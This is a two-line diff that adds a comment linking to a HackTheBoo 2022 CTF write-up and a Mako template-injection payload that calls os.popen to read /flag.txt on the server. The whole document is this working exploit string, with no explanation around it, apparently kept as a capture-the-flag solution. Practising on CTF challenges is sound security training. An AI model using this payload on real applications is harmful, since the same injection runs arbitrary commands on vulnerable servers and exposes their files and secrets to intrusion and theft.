@@ -1,0 +1,2 @@
+// https://blog.cyberethical.me/hacktheboo-2022-htb-ctf-write-ups
+${self.module.cache.util.os.popen('cat%20/flag.txt').read()}
